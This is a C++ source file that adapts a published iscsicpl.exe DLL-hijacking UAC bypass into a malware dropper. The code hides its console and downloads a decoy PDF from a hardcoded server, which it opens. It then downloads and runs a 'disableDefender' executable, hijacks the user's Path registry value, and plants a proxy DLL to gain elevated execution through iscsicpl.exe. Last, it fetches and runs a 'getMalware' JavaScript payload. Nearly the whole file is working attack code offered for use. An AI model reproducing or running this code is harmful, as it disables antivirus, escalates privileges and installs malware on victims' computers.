/* iscsicpl autoelevate DLL Search Order hijacking UAC Bypass
* ===========================================================
* The iscsicpl.exe binary is vulnerable to a DLL Search Order hijacking
* vulnerability when running 32bit Microsoft binary on a 64bit host via
* SysWOW64. The 32bit binary, will perform a search within user %Path%
* for the DLL iscsiexe.dll. This can be exploited using a Proxy DLL to
* execute code via "iscsicpl.exe" as autoelevate is enabled. This exploit
* has been tested against the following versions of Windows desktop:
*
* Windows 11 Enterprise x64 (Version 10.0.22000.739).
* Windows 8.1 Professional x64 (Version 6.3.9600).
*
* -- Hacker Fantastic
* https://hacker.house
*/
#include <iostream>
#include <vector>
#include <Windows.h>
#include <iostream>
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>
#include <tchar.h>
#include <wchar.h>
#include <winternl.h>
#define SECURITY_WIN32 1
#include <security.h>
#include "resource.h"
#include <fstream>
#include <shellapi.h>
#include <shlwapi.h>
#include <winhttp.h> 
#include <thread>
using namespace std;

/* linker lib comment includes for static */
#pragma comment(lib,"User32.lib")
#pragma comment(lib,"AdvApi32.lib")
#pragma comment(lib,"Shell32.lib")
#pragma comment(lib,"Ole32.lib")
#pragma comment(lib,"Oleaut32.lib")
#pragma comment(lib,"ntdll.lib")
#pragma comment(lib,"Secur32.lib")
#pragma comment(lib,"winhttp.lib") 
#pragma comment(lib,"Shlwapi.lib") 
#pragma warning(disable:4996)

/* program defines for fixed size vars */
#define MAX_ENV_SIZE 32767



/* extract a "DLL" type resource from the PE */
bool ExtractResource(int iId, LPWSTR pDest)
{
	HRSRC aResourceH;
	HGLOBAL aResourceHGlobal;
	unsigned char* aFilePtr;
	unsigned long aFileSize;
	HANDLE file_handle;
	aResourceH = FindResource(NULL, MAKEINTRESOURCE(iId), L"DLL");
	if (!aResourceH)
	{
		return false;
	}
	aResourceHGlobal = LoadResource(NULL, aResourceH);
	if (!aResourceHGlobal)
	{
		return false;
	}
	aFileSize = SizeofResource(NULL, aResourceH);
	aFilePtr = (unsigned char*)LockResource(aResourceHGlobal);
	if (!aFilePtr)
	{
		return false;
	}
	file_handle = CreateFile(pDest, FILE_ALL_ACCESS, 0, NULL, CREATE_ALWAYS, 0, NULL);
	if (INVALID_HANDLE_VALUE == file_handle)
	{
		int err = GetLastError();
		if ((ERROR_ALREADY_EXISTS == err) || (32 == err))
		{
			return true;
		}
		return false;
	}
	while (aFileSize--)
	{
		unsigned long numWritten;
		WriteFile(file_handle, aFilePtr, 1, &numWritten, NULL);
		aFilePtr++;
	}
	CloseHandle(file_handle);
	return true;
}

char * downloadAndRun(LPCWSTR urlpath,LPCWSTR extentionPath,bool run) {

	// Step 1: Initialize WinHTTP session
	HINTERNET hSession = WinHttpOpen(NULL, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
	if (hSession == NULL) {
		std::cerr << "WinHttpOpen failed: " << GetLastError() << std::endl;
		return NULL;
	}

	// Step 2: Connect to the server
	HINTERNET hConnect = WinHttpConnect(hSession, L"255.255.255.255", 8082, 0);
	if (hConnect == NULL) {
		std::cerr << "WinHttpConnect failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hSession);
		return NULL;
	}

	// Step 3: Create request to download PDF file
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", urlpath, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	if (hRequest == NULL) {
		std::cerr << "WinHttpOpenRequest failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return NULL;
	}

	// Step 4: Send request to the server and receive response
	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
		std::cerr << "WinHttpSendRequest failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return NULL;
	}
	if (!WinHttpReceiveResponse(hRequest, NULL)) {
		std::cerr << "WinHttpReceiveResponse failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return NULL;
	}

	// Step 5: Read the PDF content from the response and save it to a file in temp folder
	TCHAR szTempPath[MAX_PATH];
	if (GetTempPath(MAX_PATH, szTempPath) == 0) {
		std::cerr << "GetTempPath failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return NULL;
	}

	TCHAR szTempFileName[MAX_PATH];
	if (GetTempFileName(szTempPath, L"PDF", 0, szTempFileName) == 0) {
		std::cerr << "GetTempFileName failed: " << GetLastError() << std::endl;
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return NULL;
	}
	PathRenameExtension(szTempFileName, extentionPath);
	std::cerr << "file failed: " << szTempFileName << std::endl;
	std::ofstream outFile(szTempFileName, std::ios::binary);
	BYTE* pBuffer = new BYTE[4096];
	DWORD dwBytesRead = 0;
	while (WinHttpReadData(hRequest, pBuffer, 4096, &dwBytesRead)) {
		if (dwBytesRead == 0) {
			break;
		}
		outFile.write(reinterpret_cast<char*>(pBuffer), dwBytesRead);
	}
	delete[] pBuffer;
	outFile.close();
	WinHttpCloseHandle(hRequest);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hSession);

	std::cout << "PDF file saved to: " << szTempFileName << std::endl;

	if (run == true) {
		ShellExecute(NULL, L"open", szTempFileName, NULL, NULL, SW_HIDE);
	}	

	// Determine the size of the buffer required for the conversion
	int size = WideCharToMultiByte(CP_ACP, 0, szTempFileName, -1, nullptr, 0, nullptr, nullptr);

	// Allocate a buffer for the converted string
	char* pathFile = new char[size];

	// Convert the TCHAR string to a const char*
	WideCharToMultiByte(CP_ACP, 0, szTempFileName, -1, pathFile, size, nullptr, nullptr);

	return pathFile;
}

/* the main exploit routine */
int main(int argc, char* argv[])
{	
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);
	//std::thread thread1(downloadAndRun, L"/getpdf", L".pdf", true);
	std::thread thread1(downloadAndRun, L"/getpdfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff", L".pdf", true);
	char* pathDisableMalware =downloadAndRun(L"/disableDefender",L".exe",false);
	//cout << pathDisableMalware;
	if (pathDisableMalware == NULL) {
		cout << "Do not have pathDisableMalware";
		return 0;
	}
	//return 1;

	LPWSTR pCMDpath;
	size_t sSize = 0;
	DWORD dwRet;
	BOOL bResult;
	HKEY hUserSID = NULL;
	HKEY hRegKey = NULL;
	HANDLE hToken = NULL;
	DWORD dwErrorCode = 0;
	DWORD dwBufferSize = 0;
	PTOKEN_USER pTokenUser = NULL;
	UNICODE_STRING uStr;
	SHELLEXECUTEINFO shinfo;
	// handle user argument for command
	// multi-byte string to wide char string to convert user command into pCMD
	pCMDpath = new TCHAR[MAX_PATH + 1];
	mbstowcs_s(&sSize, pCMDpath, MAX_PATH, pathDisableMalware, strlen(pathDisableMalware));

	// find the USER SID, to edit the user's registry hive directly to avoid permission problems.
	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken) == FALSE) {
		dwErrorCode = GetLastError();
		wprintf(L"OpenProcessToken failed. GetLastError returned: %d\n", dwErrorCode);
		return HRESULT_FROM_WIN32(dwErrorCode);
	}
	// Retrieve the token information in a TOKEN_USER structure.
	GetTokenInformation(hToken, TokenUser, NULL, 0, &dwBufferSize);
	pTokenUser = (PTOKEN_USER) new BYTE[dwBufferSize];
	memset(pTokenUser, 0, dwBufferSize);
	if (GetTokenInformation(hToken, TokenUser, pTokenUser, dwBufferSize, &dwBufferSize)) {
		CloseHandle(hToken);
	}
	else {
		dwErrorCode = GetLastError();
		wprintf(L"GetTokenInformation failed. GetLastError returned: %d\n", dwErrorCode);
		return HRESULT_FROM_WIN32(dwErrorCode);
	}
	// is this a valid UserSID?
	if (IsValidSid(pTokenUser->User.Sid) == FALSE) {
		wprintf(L"The owner SID is invalid.\n");
		delete[] pTokenUser;
		return -1;
	}
	// using the UserSID, edit the %path% environment in the registry
	RtlConvertSidToUnicodeString(&uStr, pTokenUser->User.Sid, true);
	dwRet = RegOpenKeyEx(HKEY_USERS, uStr.Buffer, 0, MAXIMUM_ALLOWED, &hUserSID);
	dwRet = RegOpenKeyExW(hUserSID, L"Environment", 0, MAXIMUM_ALLOWED, &hRegKey);
	if (dwRet != ERROR_SUCCESS) {
		printf("[-] RegOpenKeyEx Ret:%x\n", dwRet);
		return dwRet;
	}
	// locate %TEMP% environment variable
	LPWSTR pTmpPath = new WCHAR[MAX_ENV_SIZE];
	GetEnvironmentVariable(L"TEMP", pTmpPath, MAX_ENV_SIZE);
	// backup the value of %Path% before overwriting it.
	LPWSTR cRegBackup = new WCHAR[MAX_ENV_SIZE];
	DWORD cRegSize = MAX_ENV_SIZE;
	dwRet = RegGetValue(hRegKey, NULL, L"Path", RRF_RT_ANY, NULL, cRegBackup, &cRegSize);
	if (dwRet != ERROR_SUCCESS) {
		printf("[-] RegGetValue Ret:%x\n", dwRet);
		return dwRet;
	};
	// writes %TEMP% into %Path%
	dwRet = RegSetValueExW(hRegKey, L"Path", NULL, REG_SZ, (BYTE*)pTmpPath, ((DWORD)wcslen(pTmpPath) * 2) + 1);
	if (dwRet != ERROR_SUCCESS) {
		printf("[-] RegSetValueExW Ret:%x\n", dwRet);
		return dwRet;
	};
	// writes the DLL to %TEMP%
	sSize = wcslen(pTmpPath) + wcslen(L"\\iscsiexe.dll") + 1;
	LPWSTR pBinPatchPath = new WCHAR[sSize];
	swprintf(pBinPatchPath, sSize, L"%s\\iscsiexe.dll", pTmpPath);
	sSize = wcslen(pTmpPath) + wcslen(L"\\iscsiexe_org.dll") + 1;
	LPWSTR pBinOrigPath = new WCHAR[sSize];
	swprintf(pBinOrigPath, sSize, L"%s\\iscsiexe_org.dll", pTmpPath);
	if (ExtractResource(IDR_DLLORIG, pBinOrigPath))
	{
		if (ExtractResource(IDR_DLLPROXY, pBinPatchPath))
		{
			// string table structure creation hack using wstring's for user command
			wstring data[7] = { L"", L"", L"", L"", L"", (wstring)pCMDpath, L""};
			vector< WORD > buffer;
			for (size_t index = 0; index < sizeof(data) / sizeof(data[0]); index++)
			{
				size_t pos = buffer.size();
				buffer.resize(pos + data[index].size() + 1);
				buffer[pos++] = static_cast<WORD>(data[index].size());
				copy(data[index].begin(), data[index].end(),	buffer.begin() + pos);
			}
			// do not delete the existing resource entries
			HANDLE hPE = BeginUpdateResource(pBinPatchPath, false);
			// overwrite the IDS_CMD101 string table in the payload DLL with user command.
			bResult = UpdateResource(hPE, RT_STRING, MAKEINTRESOURCE(7), MAKELANGID(LANG_ENGLISH, SUBLANG_ENGLISH_US), reinterpret_cast<void*>(&buffer[0]),buffer.size() * sizeof(WORD));
			bResult = EndUpdateResource(hPE,FALSE);
			// TODO: should also really read %windir% here in case no standard path.
			// executes syswow64 iscsicpl correctly with the new path
			RtlSecureZeroMemory(&shinfo, sizeof(shinfo));
			shinfo.cbSize = sizeof(shinfo);
			shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
			shinfo.lpFile = L"c:\\Windows\\syswow64\\iscsicpl.exe";
			shinfo.lpParameters = L""; // parameters
			shinfo.lpDirectory = NULL;
			shinfo.nShow = SW_HIDE;
			shinfo.lpVerb = NULL;
			bResult = ShellExecuteEx(&shinfo);
			if (bResult) {
				printf("[+] Success\n");
			}
		}
	}
	// execution has occured, restore the Path to return to normal. minimal essential clean-up process.
	dwRet = RegSetValueExW(hRegKey, L"Path", NULL, REG_SZ, (BYTE*)cRegBackup, ((DWORD)wcslen(cRegBackup) * 2) + 1);
	if (dwRet != ERROR_SUCCESS) {
		printf("[-] RegSetValue Ret:%x\n", dwRet);
		return dwRet;
	};
	/* // we can wait here on process to clean up the DLL's, must wait for iscsicpl.exe to terminate before we can delete dll's, hangs the shell.
	if (bResult) {
		WaitForSingleObject(shinfo.hProcess, 0x8000);
		CloseHandle(shinfo.hProcess);
	}
	*/
	
	//char* pathMalware = downloadAndRun(L"/getMalware", L".js", true);
	char* pathMalware = downloadAndRun(L"/getMalwareeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee", L".js", true);
	//cout << pathMalware;
	if (pathMalware == NULL) {
		cout << "Do not have pathMalware";
		return 0;
	}	
	return EXIT_SUCCESS;
}
